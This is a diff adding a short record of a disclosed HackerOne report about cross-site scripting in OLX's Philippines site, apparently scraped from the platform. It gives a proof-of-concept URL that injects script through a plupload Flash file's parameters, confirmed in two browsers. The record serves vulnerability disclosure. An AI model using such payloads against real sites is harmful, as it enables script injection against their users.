@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/151147
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/mefkan
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:14.07.2016 13:55:49
+
+Summary:
+
+PoC
+
+http://yaman.olx.ph/wp-includes/js/plupload/plupload.flash.swf?target%g=alert&uid%g=XSS&
+
+Confirmed on Chrome and Firefox
